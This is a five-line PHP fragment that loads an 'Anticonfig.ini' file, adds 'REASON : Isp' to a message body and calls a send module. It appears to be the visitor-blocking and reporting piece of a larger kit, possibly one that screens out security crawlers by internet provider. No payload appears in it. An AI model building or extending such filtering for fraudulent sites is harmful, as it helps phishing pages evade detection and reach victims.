<?php
$tanitatikaram = parse_ini_file("../Anticonfig.ini", true);
require_once('Module/Setmodule.php');
$body.= "REASON : Isp"."\n";
require_once('Module/Sendmodule.php');
?>